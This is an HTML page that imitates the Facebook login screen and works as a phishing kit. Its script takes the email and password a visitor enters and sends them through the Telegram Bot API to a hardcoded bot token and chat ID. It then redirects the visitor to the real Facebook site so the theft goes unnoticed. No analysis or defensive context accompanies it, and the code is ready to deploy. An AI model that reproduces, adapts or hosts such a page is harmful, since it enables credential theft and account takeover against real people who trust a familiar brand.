<!DOCTYPE html>
<html>
<head>
  <title>Facebook – log in or sign up</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
      width: 350px;
    }
    .login-box h2 {
      color: #1877f2;
      text-align: center;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      margin-bottom: 10px;
      border: 1px solid #ddd;
      border-radius: 6px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Facebook</h2>
    <form onsubmit="sendToTelegram(event)">
      <input type="email" id="email" placeholder="Email or phone number" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
  </div>

  <script>
    function sendToTelegram(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      const botToken = '7987665609:AAGoXQ4o2dDSRkTH9CKbO_itBR4m9W6hIuU';
      const chatId = '6722166633';
      const message = `🔐 New Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });

      // Optional: redirect or show fake error
      window.location.href = 'https://facebook.com';
    }
  </script>
</body>
</html>
